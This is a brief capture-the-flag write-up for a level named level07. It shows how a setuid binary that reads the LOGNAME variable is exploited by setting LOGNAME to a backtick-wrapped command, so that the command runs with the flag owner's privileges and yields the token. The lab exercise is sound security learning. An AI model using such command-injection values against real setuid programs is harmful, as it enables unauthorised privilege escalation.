`ls -l` </br>
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

We have a binary, if we do `strings` we can see it gets the environment variable LOGNAME </br>
`In computer software, logname (stands for Login Name) is a program in Unix and Unix-like operating systems that prints the name of the user who is currently logged in on the terminal. It usually corresponds to the LOGNAME variable in the system-state environment (but this variable could have been modified).` </br>
https://en.wikipedia.org/wiki/Logname

We can modify this variable to `getflag` </br>
https://book.hacktricks.xyz/pentesting-web/command-injection

```export LOGNAME=\`getflag\` ```</br>
then
`./level07` </br>
Gives the token.
